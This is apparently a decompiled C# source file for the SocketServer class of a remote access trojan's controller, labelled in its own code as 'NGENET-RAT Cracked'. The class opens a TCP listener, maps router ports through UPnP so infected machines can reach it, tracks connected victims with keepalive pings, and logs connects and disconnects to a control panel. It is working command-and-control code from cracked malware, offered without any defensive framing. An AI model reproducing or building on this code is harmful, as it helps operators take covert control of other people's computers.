using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NATUPNPLib;
using NINGALINET.My;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x02000047 RID: 71
	public class SocketServer
	{
		// Token: 0x06000996 RID: 2454 RVA: 0x000534A4 File Offset: 0x000516A4
		public SocketServer(int port)
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			this.Disconnect2 = new List<Client>();
			this.IT = new Client[101];
			this.OFF = false;
			this.Online2 = new Collection();
			this.SPL = "[endof]";
			this.upnpnat = new UPnPNATClass();
			this.mappings = this.upnpnat.StaticPortMappingCollection;
			this.h = Dns.GetHostByName(Dns.GetHostName());
			this.internalip = this.h.AddressList.GetValue(0).ToString();
			try
			{
				this.S = new TcpListener(port);
				this.S.Server.SendTimeout = -1;
				this.S.Server.ReceiveTimeout = -1;
				this.S.Start();
				Thread thread = new Thread(new ThreadStart(this.WL), 1);
				thread.Start();
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = Conversions.ToString(port);
				listViewItem.ImageIndex = 6;
				if (Operators.CompareString(ima.UPNP, "YES", false) == 0)
				{
					try
					{
						string bstrProtocol = "TCP";
						string value = Conversions.ToString(port);
						this.mappings.Remove(Conversions.ToInteger(value), bstrProtocol);
					}
					catch (Exception expr_12E)
					{
						ProjectData.SetProjectError(expr_12E);
						ProjectData.ClearProjectError();
					}
					try
					{
						this.mappings.Add(port, "TCP", port, this.internalip, true, "NGENET-RAT Cracked");
						try
						{
							IEnumerator enumerator = this.mappings.GetEnumerator();
							while (enumerator.MoveNext())
							{
								IStaticPortMapping staticPortMapping = (IStaticPortMapping)enumerator.Current;
								string[] items = new string[]
								{
									staticPortMapping.Protocol,
									Conversions.ToString(staticPortMapping.ExternalPort),
									staticPortMapping.Description
								};
								new ListViewItem(items);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						listViewItem.SubItems.Add("Listening");
						listViewItem.SubItems.Add(ima.UPNP);
					}
					catch (Exception expr_1FE)
					{
						ProjectData.SetProjectError(expr_1FE);
						listViewItem.SubItems.Add("UPnP doesn't seem to be enabled on your router");
						listViewItem.SubItems.Add("NO");
						ProjectData.ClearProjectError();
					}
					MyProject.Forms.Form1.Lv1.Items.Add(listViewItem);
					MyProject.Forms.Form1.Lv1.FX();
				}
				else
				{
					listViewItem.SubItems.Add("Listening");
					listViewItem.SubItems.Add("NO");
					MyProject.Forms.Form1.Lv1.Items.Add(listViewItem);
					MyProject.Forms.Form1.Lv1.FX();
				}
			}
			catch (Exception expr_2B5)
			{
				ProjectData.SetProjectError(expr_2B5);
				Exception ex = expr_2B5;
				ListViewItem listViewItem2 = new ListViewItem();
				listViewItem2.Text = Conversions.ToString(port);
				listViewItem2.SubItems.Add(ex.Message);
				listViewItem2.SubItems.Add("NO");
				listViewItem2.ImageIndex = 5;
				MyProject.Forms.Form1.Lv1.Items.Add(listViewItem2);
				MyProject.Forms.Form1.Lv1.FX();
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000997 RID: 2455 RVA: 0x00004F1E File Offset: 0x0000311E
		private void _Lambda__2(object a0)
		{
			this.READ(Conversions.ToInteger(RuntimeHelpers.GetObjectValue(a0)));
		}

		// Token: 0x06000998 RID: 2456 RVA: 0x0005384C File Offset: 0x00051A4C
		public Array fx(byte[] b)
		{
			List<byte[]> list = new List<byte[]>();
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2 = new MemoryStream();
			string[] array = Strings.Split(Fungsi.BS(ref b), this.SPL, -1, CompareMethod.Binary);
			memoryStream.Write(b, 0, array[0].Length);
			checked
			{
				memoryStream2.Write(b, array[0].Length + this.SPL.Length, b.Length - (array[0].Length + this.SPL.Length));
				list.Add(memoryStream.ToArray());
				list.Add(memoryStream2.ToArray());
				memoryStream.Dispose();
				memoryStream2.Dispose();
				return list.ToArray();
			}
		}

		// Token: 0x06000999 RID: 2457 RVA: 0x000538F4 File Offset: 0x00051AF4
		public Client GetClient(string ID)
		{
			Collection online = this.Online2;
			Collection obj = online;
			Client result;
			lock (obj)
			{
				try
				{
					result = (Client)online[ID];
					return result;
				}
				catch (Exception expr_1F)
				{
					ProjectData.SetProjectError(expr_1F);
					Exception projectError = expr_1F;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				result = null;
			}
			return result;
		}

		// Token: 0x0600099A RID: 2458 RVA: 0x00053964 File Offset: 0x00051B64
		public void pnd()
		{
			while (true)
			{
				try
				{
					Client client = new Client(this.S.AcceptTcpClient());
					client.Client.ReceiveTimeout = -1;
					client.Client.SendTimeout = -1;
					Collection online = this.Online2;
					Collection obj = online;
					lock (obj)
					{
						online.Add(client, client.ip(), null, null);
					}
					if (ima.F.SLGS3.Checked)
					{
						ima.F.Pp1.WRT(new object[]
						{
							Color.WhiteSmoke,
							Fungsi.HM(),
							Resources._244,
							client.ip(),
							Color.YellowGreen,
							"Connected"
						});
					}
				}
				catch (Exception expr_BB)
				{
					ProjectData.SetProjectError(expr_BB);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x0600099B RID: 2459 RVA: 0x00053A5C File Offset: 0x00051C5C
		private void READ(int id)
		{
			checked
			{
				while (true)
				{
					if (this.IT[id] == null)
					{
						Thread.Sleep(1);
					}
					else
					{
						Client client = this.IT[id];
						if (!this.OFF && client.CN)
						{
							try
							{
								if (!client.Client.Connected)
								{
									goto IL_396;
								}
								if (!client.IsPNGED)
								{
									if (client.Ping > 1200)
									{
										client.IsPNGED = true;
										client.Ping = 0;
										if (!client.Send("P"))
										{
											goto IL_396;
										}
									}
								}
								else if (client.Ping > 3000)
								{
									goto IL_396;
								}
								if (client.Client.Available > 0)
								{
									byte[] array = new byte[client.Client.Available - 1 + 1 - 1 + 1];
									client.Client.Client.Receive(array, 0, array.Length, SocketFlags.None);
									ima.RC = array.Length;
									ima.RC2 += array.Length;
									client.M.Write(array, 0, array.Length);
									while (true)
									{
										byte[] array2 = client.M.ToArray();
										if (!Fungsi.BS(ref array2).Contains(this.SPL))
										{
											goto IL_2D3;
										}
										Array array3 = this.fx(client.M.ToArray());
										byte[] array4 = (byte[])NewLateBinding.LateIndexGet(array3, new object[]
										{
											0
										}, null);
										NewLateBinding.LateIndexSetComplex(array3, new object[]
										{
											0,
											array4
										}, null, true, false);
										if (Operators.CompareString(Fungsi.BS(ref array4), "P", false) == 0)
										{
											if (client.L == null)
											{
												break;
											}
											object[] array5 = new object[2];
											array5[0] = client;
											object[] arg_1C1_0 = array5;
											int arg_1C1_1 = 1;
											string text = "P" + ima.Y + Conversions.ToString(client.Ping);
											arg_1C1_0[arg_1C1_1] = Fungsi.SB(ref text);
											ima.Req(array5);
											client.IsPNGED = false;
											client.Ping = 0;
										}
										else
										{
											ima.Req(new object[]
											{
												client,
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array3, new object[]
												{
													0
												}, null))))
											});
										}
										client.M.Dispose();
										client.M = new MemoryStream();
										if (array3.Length != 2)
										{
											goto IL_2D3;
										}
										client.M.Write((byte[])NewLateBinding.LateIndexGet(array3, new object[]
										{
											1
										}, null), 0, Conversions.ToInteger(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array3, new object[]
										{
											1
										}, null)), null, "length", new object[0], null, null, null))));
									}
									goto IL_396;
									IL_2D3:;
								}
							}
							catch (Exception expr_2D5)
							{
								ProjectData.SetProjectError(expr_2D5);
								Exception projectError = expr_2D5;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								goto IL_396;
							}
							client.Buzy = false;
							this.IT[id] = null;
							continue;
						}
						IL_396:
						client.T.Enabled = false;
						client.T.Dispose();
						client.CN = false;
						List<Client> disconnect = this.Disconnect2;
						List<Client> obj = disconnect;
						lock (obj)
						{
							disconnect.Add(client);
						}
						this.IT[id] = null;
						if (ima.F.SLGS3.Checked)
						{
							ima.F.Pp1.WRT(new object[]
							{
								Color.WhiteSmoke,
								Fungsi.HM(),
								Resources._245,
								client.ip(),
								Color.Red,
								"Disconnected "
							});
						}
					}
				}
			}
		}

		// Token: 0x0600099C RID: 2460 RVA: 0x00053E68 File Offset: 0x00052068
		private void WL()
		{
			int num = 0;
			checked
			{
				int num2 = this.IT.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					new Thread(new ParameterizedThreadStart(this._Lambda__2), 0)
					{
						Priority = ThreadPriority.Lowest
					}.Start(i);
				}
				Thread thread = new Thread(new ThreadStart(this.pnd));
				thread.Start();
				while (true)
				{
					Collection online = this.Online2;
					Collection obj = online;
					lock (obj)
					{
						List<Client> disconnect = this.Disconnect2;
						List<Client> obj2 = disconnect;
						lock (obj2)
						{
							int num3 = 0;
							do
							{
								try
								{
									if (disconnect.Count > 0)
									{
										Client client = disconnect[0];
										disconnect.RemoveAt(0);
										try
										{
											client.Client.Client.Disconnect(false);
										}
										catch (Exception expr_BF)
										{
											ProjectData.SetProjectError(expr_BF);
											Exception projectError = expr_BF;
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
											ProjectData.ClearProjectError();
										}
										try
										{
											client.Client.Close();
										}
										catch (Exception expr_E9)
										{
											ProjectData.SetProjectError(expr_E9);
											Exception projectError2 = expr_E9;
											ProjectData.SetProjectError(projectError2);
											ProjectData.ClearProjectError();
											ProjectData.ClearProjectError();
										}
										this.Online2.Remove(client.ip().ToString());
										thread = new Thread(new ParameterizedThreadStart(ima.Req), 1);
										object[] array = new object[2];
										array[0] = client;
										string text = "!";
										array[1] = Fungsi.SB(ref text);
										thread.Start(array);
									}
								}
								catch (Exception expr_15A)
								{
									ProjectData.SetProjectError(expr_15A);
									Exception projectError3 = expr_15A;
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
								}
								num3++;
							}
							while (num3 <= 0);
							int num4 = this.IT.Length - 1;
							for (int j = 0; j <= num4; j++)
							{
								if (this.IT[j] == null)
								{
									if (this.Online2.Count <= 0)
									{
										break;
									}
									num++;
									if (num > this.Online2.Count)
									{
										num = 1;
									}
									Client client = (Client)this.Online2[num];
									if (!client.Buzy)
									{
										client.Buzy = true;
										this.IT[j] = client;
									}
								}
							}
						}
					}
					Thread.Sleep(1);
				}
			}
		}

		// Token: 0x040004A5 RID: 1189
		public List<Client> Disconnect2;

		// Token: 0x040004A6 RID: 1190
		private Client[] IT;

		// Token: 0x040004A7 RID: 1191
		private bool OFF;

		// Token: 0x040004A8 RID: 1192
		public Collection Online2;

		// Token: 0x040004A9 RID: 1193
		public TcpListener S;

		// Token: 0x040004AA RID: 1194
		public string SPL;

		// Token: 0x040004AB RID: 1195
		private UPnPNAT upnpnat;

		// Token: 0x040004AC RID: 1196
		private IStaticPortMappingCollection mappings;

		// Token: 0x040004AD RID: 1197
		private IPHostEntry h;

		// Token: 0x040004AE RID: 1198
		private string internalip;
	}
}
